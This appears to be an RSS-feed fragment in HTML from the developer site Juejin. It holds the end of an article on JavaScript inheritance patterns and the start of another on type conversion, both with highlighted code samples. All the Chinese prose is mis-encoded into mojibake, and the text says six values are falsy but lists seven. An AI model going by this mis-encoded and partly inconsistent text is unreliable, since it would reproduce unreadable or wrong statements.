<span class="hljs-keyword">class</span> <span class="hljs-title class_">MySQLService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">DatabaseService</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">query</span>(<span class="hljs-params">sql</span>) { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-comment">// 3. éœ€è¦ç±»å‹æ£€æŸ¥</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> name !== <span class="hljs-string">'string'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Name must be a string'</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
}
</code></pre>
<h2 data-id="heading-20">9. æ··åˆä½¿ç”¨æ¨¡å¼ï¼ˆä¸€èˆ¬ç”¨ä¸åˆ°ï¼‰</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç»“åˆä¸¤ç§æ–¹å¼</span>
<span class="hljs-comment">// ä½¿ç”¨ç±»ä½œä¸ºåŸºç¡€</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventEmitter</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span> = {};
  }
  
  <span class="hljs-title function_">on</span>(<span class="hljs-params">event, listener</span>) {
    (<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[event] || (<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[event] = [])).<span class="hljs-title function_">push</span>(listener);
  }
  
  <span class="hljs-title function_">emit</span>(<span class="hljs-params">event, ...args</span>) {
    (<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[event] || []).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> <span class="hljs-title function_">listener</span>(...args));
  }
}

<span class="hljs-comment">// ä½¿ç”¨å¯„ç”Ÿç»„åˆç»§æ‰¿æ‰©å±•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createObservable</span>(<span class="hljs-params">SuperClass</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Observable</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">SuperClass</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span> = [];
  }
  
  <span class="hljs-title class_">Observable</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">SuperClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  <span class="hljs-title class_">Observable</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Observable</span>;
  
  <span class="hljs-title class_">Observable</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">subscribe</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">observer</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span>.<span class="hljs-title function_">push</span>(observer);
  };
  
  <span class="hljs-title class_">Observable</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">notify</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observers</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">observer</span> =&gt;</span> <span class="hljs-title function_">observer</span>(data));
  };
  
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Observable</span>;
}

<span class="hljs-comment">// ç»„åˆä½¿ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">createObservable</span>(<span class="hljs-title class_">EventEmitter</span>) {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-variable language_">super</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data;
  }
  
  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>[key] = value;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">notify</span>({ key, value });
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'change'</span>, { key, value });
  }
}
</code></pre>
<h2 data-id="heading-21">10. æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-22">ç°ä»£é¡¹ç›®</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä½¿ç”¨ ES6 ç±»ç»§æ‰¿</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config;
  }
  
  <span class="hljs-title function_">validateConfig</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// éªŒè¯é…ç½®</span>
  }
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Method not implemented'</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">BaseService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config</span>) {
    <span class="hljs-variable language_">super</span>(config);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateConfig</span>();
  }
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å®ç°åˆå§‹åŒ–</span>
  }
}
</code></pre>
<h3 data-id="heading-23">éœ€è¦å…¼å®¹æ€§çš„é¡¹ç›®</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä½¿ç”¨æ¨¡å—åŒ–çš„å¯„ç”Ÿç»„åˆç»§æ‰¿</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createClass</span>(<span class="hljs-params">superClass, definition</span>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = definition.<span class="hljs-property">constructor</span> || <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    superClass.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);
  };
  
  <span class="hljs-comment">// åŸå‹ç»§æ‰¿</span>
  <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(superClass.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;
  
  <span class="hljs-comment">// æ··å…¥æ–¹æ³•</span>
  <span class="hljs-keyword">if</span> (definition.<span class="hljs-property">methods</span>) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, definition.<span class="hljs-property">methods</span>);
  }
  
  <span class="hljs-comment">// é™æ€æ–¹æ³•ç»§æ‰¿</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(<span class="hljs-title class_">Child</span>, superClass);
  
  <span class="hljs-comment">// æ·»åŠ é™æ€æ–¹æ³•</span>
  <span class="hljs-keyword">if</span> (definition.<span class="hljs-property">statics</span>) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Child</span>, definition.<span class="hljs-property">statics</span>);
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Child</span>;
}
</code></pre>
<h2 data-id="heading-24">æ€»ç»“</h2>








































<table><thead><tr><th>æ–¹é¢</th><th>æ¨èé€‰æ‹©</th><th>åŸå› </th></tr></thead><tbody><tr><td><strong>ç°ä»£ Web é¡¹ç›®</strong>â€‹</td><td>ES6 ç±»ç»§æ‰¿</td><td>è¯­æ³•ç®€æ´ï¼Œå·¥å…·æ”¯æŒå¥½</td></tr><tr><td><strong>åº“/æ¡†æ¶å¼€å‘</strong>â€‹</td><td>ES6 ç±»ç»§æ‰¿</td><td>æ›´å¥½çš„å¼€å‘ä½“éªŒ</td></tr><tr><td><strong>éœ€è¦æ”¯æŒæ—§ IE</strong>â€‹</td><td>å¯„ç”Ÿç»„åˆç»§æ‰¿</td><td>å…¼å®¹æ€§å¥½</td></tr><tr><td><strong>æ€§èƒ½å…³é”®</strong>â€‹</td><td>ES6 ç±»ç»§æ‰¿</td><td>ç°ä»£å¼•æ“ä¼˜åŒ–å¥½</td></tr><tr><td><strong>ä»£ç å¯è¯»æ€§</strong>â€‹</td><td>ES6 ç±»ç»§æ‰¿</td><td>è¯­æ³•æ›´æ¸…æ™°</td></tr><tr><td><strong>å›¢é˜Ÿç†Ÿæ‚‰åº¦</strong>â€‹</td><td>å›¢é˜Ÿç†Ÿæ‚‰çš„</td><td>é™ä½å­¦ä¹ æˆæœ¬</td></tr></tbody></table>
<p><strong>æœ€ç»ˆå»ºè®®</strong>ï¼š</p>
<ul>
<li>æ–°é¡¹ç›®ä¸€å¾‹ä½¿ç”¨ <strong>ES6 ç±»ç»§æ‰¿</strong></li>
<li>æ—§é¡¹ç›®ç»´æŠ¤æ—¶ï¼Œå¦‚æœå·²ç»æ˜¯å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼Œå¯ä¿æŒ</li>
<li>éœ€è¦ç‰¹æ®Šç»§æ‰¿æ¨¡å¼æ—¶ï¼Œå¯æ··ç”¨ä¸¤ç§æ–¹å¼</li>
<li>å§‹ç»ˆè€ƒè™‘å›¢é˜Ÿæˆå‘˜æŠ€èƒ½å’Œé¡¹ç›®éœ€æ±‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScriptç±»å‹å˜å½¢è®°ï¼šå½“ä»£ç å¼€å§‹â€œä¸æ­£ç»â€åœ°è½¬æ¢èº«ä»½]]></title>    <link>https://juejin.cn/post/7581481178823671827</link>    <guid>https://juejin.cn/post/7581481178823671827</guid>    <pubDate>2025-12-09T08:59:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581481178823671827" data-draft-id="7581210455827431460" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScriptç±»å‹å˜å½¢è®°ï¼šå½“ä»£ç å¼€å§‹â€œä¸æ­£ç»â€åœ°è½¬æ¢èº«ä»½ "/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-09T08:59:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ±‰å ¡å¤§ç‹9527"/> <meta itemprop="url" content="https://juejin.cn/user/643629279092743"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScriptç±»å‹å˜å½¢è®°ï¼šå½“ä»£ç å¼€å§‹â€œä¸æ­£ç»â€åœ°è½¬æ¢èº«ä»½ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/643629279092743/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ±‰å ¡å¤§ç‹9527
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T08:59:00.000Z" title="Tue Dec 09 2025 08:59:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨JavaScriptçš„ä¸–ç•Œé‡Œï¼Œç±»å‹è½¬æ¢å°±åƒä¸€åœºé­”æœ¯è¡¨æ¼”â€”â€”æœ‰æ—¶æ˜¯ç²¾å½©çš„æ˜¾ç¤ºå˜æ¢ï¼Œæœ‰æ—¶æ˜¯æš—ç®±æ“ä½œçš„éšå¼è½¬æ¢ã€‚ä»Šå¤©æˆ‘ä»¬æ¥æ­ç§˜è¿™åœºé­”æœ¯è¡¨æ¼”çš„çœŸé¢çº±ï¼</p>
<h2 data-id="heading-0">==vs===</h2>
<p><code>==</code>åœ¨æ¯”è¾ƒæ—¶ä¼šè¿›è¡Œéšå¼ç±»å‹è½¬æ¢ï¼Œè€Œ<code>===</code>ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢ï¼Œè¦æ±‚å€¼å’Œç±»å‹éƒ½å¿…é¡»ç›¸åŒã€‚</p>
<pre><code class="hljs language-ini" lang="ini">// === ä¸¥æ ¼ç›¸ç­‰ï¼šç±»å‹å’Œå€¼éƒ½å¿…é¡»ç›¸åŒ
<span class="hljs-attr">1</span> === <span class="hljs-number">1</span><span class="hljs-comment">;      // true</span>
<span class="hljs-attr">'1'</span> === <span class="hljs-string">'1'</span><span class="hljs-comment">;  // true</span>
<span class="hljs-attr">1</span> === <span class="hljs-string">'1'</span><span class="hljs-comment">;    // falseï¼ˆç±»å‹ä¸åŒï¼‰</span>

// == å®½æ¾ç›¸ç­‰ï¼šä¼šè¿›è¡Œç±»å‹è½¬æ¢åæ¯”è¾ƒ
<span class="hljs-attr">1</span> == <span class="hljs-string">'1'</span><span class="hljs-comment">;     // trueï¼ˆå­—ç¬¦ä¸²'1'è½¬æ¢ä¸ºæ•°å­—1ï¼‰</span>
<span class="hljs-attr">0</span> == <span class="hljs-literal">false</span><span class="hljs-comment">;   // trueï¼ˆfalseè½¬æ¢ä¸º0ï¼‰</span>
<span class="hljs-attr">null</span> == undefined<span class="hljs-comment">; // trueï¼ˆç‰¹æ®Šè§„åˆ™ï¼‰</span>

</code></pre>
<h2 data-id="heading-1">ç±»å‹è½¬æ¢çš„ä¸¤ç§å½¢å¼</h2>
<h3 data-id="heading-2">1. æ˜¾å¼ç±»å‹è½¬æ¢</h3>
<p>å¼€å‘è€…æ˜ç¡®è°ƒç”¨è½¬æ¢å‡½æ•°è¿›è¡Œçš„ç±»å‹è½¬æ¢ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹è§çš„ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æ˜¾å¼è½¬æ¢ä¸ºæ•°å­—</span>
<span class="hljs-built_in">Number</span>('<span class="hljs-number">123</span>');    <span class="hljs-comment">// 123</span>
<span class="hljs-built_in">parseInt</span>('<span class="hljs-number">123</span>');  <span class="hljs-comment">// 123</span>

<span class="hljs-comment">// æ˜¾å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-built_in">String</span>(<span class="hljs-number">123</span>);      <span class="hljs-comment">// '123'</span>
(<span class="hljs-number">123</span>)<span class="hljs-selector-class">.toString</span>(); <span class="hljs-comment">// '123'</span>

<span class="hljs-comment">// æ˜¾å¼è½¬æ¢ä¸ºå¸ƒå°”å€¼</span>
<span class="hljs-built_in">Boolean</span>(<span class="hljs-number">0</span>);       <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>('');      <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-3">2. éšå¼ç±»å‹è½¬æ¢</h3>
<p>JavaScriptå¼•æ“åœ¨ç‰¹å®šæ“ä½œä¸­è‡ªåŠ¨è¿›è¡Œçš„ç±»å‹è½¬æ¢ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ç®—æœ¯è¿ç®—ä¸­çš„éšå¼è½¬æ¢</span>
<span class="hljs-string">'123'</span> - <span class="hljs-number">0</span>;        <span class="hljs-comment">// 123ï¼ˆå­—ç¬¦ä¸²è½¬æ•°å­—ï¼‰</span>
<span class="hljs-number">123</span> + <span class="hljs-string">''</span>;         <span class="hljs-comment">// '123'ï¼ˆæ•°å­—è½¬å­—ç¬¦ä¸²ï¼‰</span>

<span class="hljs-comment">// é€»è¾‘åˆ¤æ–­ä¸­çš„éšå¼è½¬æ¢</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">'hello'</span>) {    <span class="hljs-comment">// å­—ç¬¦ä¸²è½¬å¸ƒå°”å€¼</span>
  <span class="hljs-comment">// ä¼šæ‰§è¡Œï¼Œå› ä¸º'hello'è½¬æ¢ä¸ºtrue</span>
}

<span class="hljs-comment">// æ¯”è¾ƒè¿ç®—ä¸­çš„éšå¼è½¬æ¢</span>
<span class="hljs-string">'2'</span> &gt; <span class="hljs-number">1</span>;          <span class="hljs-comment">// trueï¼ˆ'2'è½¬æ¢ä¸º2ï¼‰</span>
</code></pre>
<h2 data-id="heading-4">åŸå§‹å€¼ä¹‹é—´çš„ç±»å‹è½¬æ¢</h2>
<h3 data-id="heading-5">1. è½¬æ¢ä¸ºæ•°å­—ï¼ˆToNumberï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Number</span>(<span class="hljs-string">'123'</span>);     <span class="hljs-comment">// 123</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">''</span>);        <span class="hljs-comment">// 0</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">'hello'</span>);   <span class="hljs-comment">// NaN</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-literal">true</span>);      <span class="hljs-comment">// 1</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-literal">false</span>);     <span class="hljs-comment">// 0</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-literal">null</span>);      <span class="hljs-comment">// 0</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-literal">undefined</span>); <span class="hljs-comment">// NaN</span>

<span class="hljs-comment">// ä¸€å…ƒåŠ è¿ç®—ç¬¦ä¹Ÿæ‰§è¡Œæ•°å­—è½¬æ¢</span>
+<span class="hljs-string">'123'</span>;  <span class="hljs-comment">// 123</span>
+<span class="hljs-literal">true</span>;   <span class="hljs-comment">// 1</span>
</code></pre>
<h3 data-id="heading-6">2. è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼ˆToStringï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">String</span>(<span class="hljs-number">123</span>);       <span class="hljs-comment">// '123'</span>
<span class="hljs-built_in">String</span>(true);      <span class="hljs-comment">// 'true'</span>
<span class="hljs-built_in">String</span>(false);     <span class="hljs-comment">// 'false'</span>
<span class="hljs-built_in">String</span>(null);      <span class="hljs-comment">// 'null'</span>
<span class="hljs-built_in">String</span>(undefined); <span class="hljs-comment">// 'undefined'</span>
</code></pre>
<h3 data-id="heading-7">3. è½¬æ¢ä¸ºå¸ƒå°”å€¼ï¼ˆToBooleanï¼‰</h3>
<p>JavaScriptä¸­åªæœ‰ä»¥ä¸‹6ä¸ªå€¼ä¼šè½¬æ¢ä¸ºfalseï¼Œå…¶ä»–æ‰€æœ‰å€¼éƒ½è½¬æ¢ä¸ºtrueï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Boolean</span>(false);     <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>(<span class="hljs-number">0</span>);         <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>(-<span class="hljs-number">0</span>);        <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>('');        <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>(null);      <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>(undefined); <span class="hljs-comment">// false</span>
<span class="hljs-built_in">Boolean</span>(NaN);       <span class="hljs-comment">// false</span>

<span class="hljs-comment">// å…¶ä»–æ‰€æœ‰å€¼éƒ½æ˜¯true</span>
<span class="hljs-built_in">Boolean</span>('<span class="hljs-number">0</span>');       <span class="hljs-comment">// trueï¼ˆæ³¨æ„ï¼šå­—ç¬¦ä¸²'0'ä¸æ˜¯0ï¼‰</span>
<span class="hljs-built_in">Boolean</span>([]);        <span class="hljs-comment">// true</span>
<span class="hljs-built_in">Boolean</span>({});        <span class="hljs-comment">// true</span>
<span class="hljs-built_in">Boolean</span>(function(){}); <span class="hljs-comment">// true</span>
</code></pre>
<h2 data-id="heading-8">å¼•ç”¨ç±»å‹è½¬æ¢ä¸ºåŸå§‹å€¼ï¼ˆé€šå¸¸å‘ç”Ÿåœ¨éšå¼ç±»å‹è½¬æ¢ä¸­ï¼‰</h2>
<h3 data-id="heading-9">1. è½¬æ¢ä¸ºå¸ƒå°”å€¼</h3>
<p>æ‰€æœ‰å¼•ç”¨ç±»å‹ï¼ˆå¯¹è±¡ã€æ•°ç»„ã€å‡½æ•°ç­‰ï¼‰è½¬æ¢ä¸ºå¸ƒå°”å€¼éƒ½æ˜¯trueã€‚</p>
<h3 data-id="heading-10">2. è½¬æ¢ä¸ºæ•°å­—ï¼ˆå¼•ç”¨ç±»å‹ â†’ åŸå§‹å€¼ â†’ æ•°å­—ï¼‰</h3>
<p>è½¬æ¢è¿‡ç¨‹éµå¾ªToPrimitiveç®—æ³•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// è½¬æ¢æ­¥éª¤ï¼š</span>
<span class="hljs-comment">// 1. è°ƒç”¨valueOf()æ–¹æ³•ï¼Œå¦‚æœè¿”å›åŸå§‹å€¼ï¼Œä½¿ç”¨è¯¥å€¼</span>
<span class="hljs-comment">// 2. å¦åˆ™è°ƒç”¨toString()æ–¹æ³•ï¼Œå¦‚æœè¿”å›åŸå§‹å€¼ï¼Œä½¿ç”¨è¯¥å€¼</span>
<span class="hljs-comment">// 3. å¦åˆ™æŠ›å‡ºTypeError</span>

<span class="hljs-built_in">Number</span>({});            <span class="hljs-comment">// NaN</span>
<span class="hljs-comment">// {}.valueOf() â†’ {}ï¼ˆä»æ˜¯å¯¹è±¡ï¼‰</span>
<span class="hljs-comment">// {}.toString() â†’ '[object Object]'</span>
<span class="hljs-comment">// Number('[object Object]') â†’ NaN</span>

<span class="hljs-built_in">Number</span>([<span class="hljs-number">123</span>]);         <span class="hljs-comment">// 123</span>
<span class="hljs-comment">// [123].valueOf() â†’ [123]ï¼ˆä»æ˜¯æ•°ç»„ï¼‰</span>
<span class="hljs-comment">// [123].toString() â†’ '123'</span>
<span class="hljs-comment">// Number('123') â†’ 123</span>

<span class="hljs-built_in">Number</span>([]);            <span class="hljs-comment">// 0</span>
<span class="hljs-comment">// [].toString() â†’ ''</span>
<span class="hljs-comment">// Number('') â†’ 0</span>
</code></pre>
<h3 data-id="heading-11">3. è½¬æ¢ä¸ºå­—ç¬¦ä¸²</h3>
<p>ä¸è½¬æ¢ä¸ºæ•°å­—ç±»ä¼¼ï¼Œä½†ä¼˜å…ˆè°ƒç”¨toString()æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">String</span>({});            <span class="hljs-comment">// '[object Object]'</span>
<span class="hljs-built_in">String</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);     <span class="hljs-comment">// '1,2,3'</span>
<span class="hljs-built_in">String</span>([]);            <span class="hljs-comment">// ''</span>
